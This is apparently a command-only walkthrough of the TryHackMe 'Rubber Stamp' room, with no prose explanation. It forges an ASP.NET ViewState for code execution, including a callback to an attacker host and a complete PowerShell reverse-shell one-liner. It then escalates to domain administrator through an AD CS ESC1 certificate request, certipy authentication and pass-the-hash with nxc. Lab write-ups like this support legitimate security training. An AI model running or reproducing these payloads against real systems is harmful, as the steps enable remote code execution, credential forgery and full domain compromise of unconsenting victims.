# Tryhackme room Rubber Stamp https://tryhackme.com/room/rubberstamp
# Youtube video walk through: https://youtu.be/d7N3ouYnJQY

# Machine key leak (via global.asax.bak dispatch):
 
```
curl -s "http://10.128.183.112/legacy/RequestStatus.aspx?id=none&debug=true"
```
```
python3 build_vs.py 'powershell -c iwr http://10.128.81.65:8000/callback'
```
```
curl -sS -i -X POST \
  'http://10.128.163.195/legacy/RequestStatus.aspx?id=1' \
  --data-urlencode '__VIEWSTATE@forged_vs.b64' \
  --data-urlencode '__VIEWSTATEGENERATOR=0CA456E0'
```

# shell
```
python3 build_vs.py -ps \
'$c=New-Object Net.Sockets.TCPClient("10.128.81.65",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
```

```
curl -sS -i -X POST \
  'http://10.128.181.36/legacy/RequestStatus.aspx?id=1' \
  --data-urlencode '__VIEWSTATE@forged_vs.b64' \
  --data-urlencode '__VIEWSTATEGENERATOR=0CA456E0'
```
# cert

# Create esc1.cnf:
```
[req]
distinguished_name=dn
req_extensions=ext
prompt=no

[dn]
CN=Administrator

[ext]
subjectAltName=@alt

[alt]
otherName.1=1.3.6.1.4.1.311.20.2.3;UTF8:administrator@rubberstamp.local
DNS.1=administrator.rubberstamp.local
```

# Generate:

```
openssl req -new -newkey rsa:2048 -nodes \
  -keyout esc1.key \
  -out esc1.csr \
  -config esc1.cnf
```
```
openssl req -in esc1.csr -outform DER | base64 -w0  
```
```
$csr = "MMAbMCAQA****Pn0="
```

```
$postData = @{Mode="newreq";CertRequest=$csr;CertAttrib="CertificateTemplate:PrivClientAuth";TargetStoreFlags="0";SaveCert="no"}
```
```
$postData.CertRequest.Length
```
```
$requestData = Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri "http://SRV01.rubberstamp.local/certsrv/certfnsh.asp" -Method Post -Body $postData -TimeoutSec 20
```
```
$req = [regex]::Match($requestData.Content, 'ReqID=(\d+)').Groups[1].Value
$req
```

# And retrieve the certificate:

```
Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri "http://SRV01.rubberstamp.local/certsrv/certnew.cer?ReqID=$req&Enc=b64" -OutFile C:\badr\admin_cert.pem -TimeoutSec 20
```
```
Get-Content -Raw C:\badr\admin_cert.pem
```

# admin_cert.pem

```
openssl pkcs12 -export \
  -inkey esc1.key \
  -in admin_cert.pem \
  -out admin.pfx \
  -passout pass:pass
```
```
openssl x509 -in admin_cert.pem -noout -modulus | openssl md5
openssl rsa  -in esc1.key      -noout -modulus | openssl md5
```
```
certipy auth \
  -pfx  admin.pfx \
  -password pass \
  -username administrator \
  -domain rubberstamp.local \
  -dc-ip 10.128.136.93
```
```
nxc smb 10.128.136.93 -u Administrator -H 74**********e3f9 \
  -x 'type C:\Users\Administrator\Desktop\root.txt'
```
